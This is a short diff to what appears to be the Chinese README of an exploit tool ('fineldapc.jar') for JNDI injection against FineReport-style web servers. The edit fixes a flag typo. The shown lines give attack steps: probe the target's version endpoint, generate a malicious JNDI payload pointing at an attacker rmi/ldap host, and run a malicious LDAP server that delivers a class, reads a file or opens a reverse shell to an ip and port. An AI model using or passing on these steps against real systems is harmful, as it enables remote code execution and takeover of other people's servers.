@@ -17,7 +17,7 @@
 
 获取版本: /webroot/decision/system/info
 
-生成恶意jndibin：java -jar fineldapc.jar -jndibinbin  [rmi|ldap]://host:port/obj
+生成恶意jndibin：java -jar fineldapc.jar -jndibin  [rmi|ldap]://host:port/obj
 
 开启恶意ldap：java -jar fineldapc.jar -jndibin <port> <CLASS:classname>/<resershell:ip#port>/<FILE:filepath>
 
